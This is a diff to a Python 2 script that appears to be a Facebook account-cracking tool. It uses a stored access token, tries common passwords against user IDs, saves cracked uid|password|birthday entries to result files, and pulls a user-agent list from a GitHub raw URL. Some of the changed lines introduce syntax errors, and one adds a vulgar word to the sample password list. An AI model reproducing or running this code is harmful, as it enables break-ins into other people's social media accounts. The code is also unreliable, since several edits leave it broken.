@@ -277,7 +277,7 @@ def public():
 						token = open('login.txt').read()
 						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
 						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
+						ttl = data['+birthday'].replace("/","-")
 						nama = data['name']
 						print('\r  \033[0;93m* --> ' +uid+ '|' + pw + '|' + ttl +)
 						cp.append(uid+'|'+pw+'|'+ttl+)
@@ -488,7 +488,7 @@ def reaction():
 	exit("\n \033[0;97m[\033[0;96m#\033[0;97m] Finished")
 
 def manual():
-	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,indonesia")
+	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,123456,angga kontol,indonesia")
 	pw = raw_input(" \033[0;97m[\033[0;93m?\033[0;97m] Set Password : ")
 	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Crack With Password : \033[0;91m%s"%(pw))
 	if len(pw) ==0:
@@ -527,7 +527,7 @@ def manual():
 						data = s.get(url).json()
 						ttl = data['birthday'].replace("/","-")
 						print('\r  \033[0;93m* --> ' +uid+ '|' + asu + '|' + ttl)
-						cp.append(uid+'|'+asu+'|'+ttl)
+						cp.append(uid+'|'+asu+'|'+ttl+)
 						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
 						save.write('  * --> '+str(uid)+'|'+str(asu)+'|'+ttl+'\n')
 						save.close()
@@ -569,7 +569,7 @@ def settua():
 			exit()
 	elif ask == "t" or ask == "T":
 		try:
-			ua = s.get("https://raw.githubusercontent.com/avsid/data-kontol999/main/ua.txt").text.strip()
+			ua = s.get("https://raw.githubusercontent.com/avsid/data-slayer079/main/ua.txt").text.strip()
 			save = open(".ua","w")
 			save.write(ua) 
 			save.close()
@@ -583,7 +583,7 @@ def settua():
 
 if __name__ == '__main__':
 	try:
-		ua = s.get("https://raw.githubusercontent.com/avsid/data-kontol999/main/ua.txt").text.strip()
+		ua = s.get("https://raw.githubusercontent.com/avsid/data-slayer079/main/ua.txt").text.strip()
 		save = open(".ua","w")
 		save.write(ua) 
 		save.close()
@@ -592,6 +592,6 @@ if __name__ == '__main__':
 	if sys.version[0]!="3":
 		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
 	else:
-		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 main.py")
+		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
 	os.system("git kontol")
 	login()
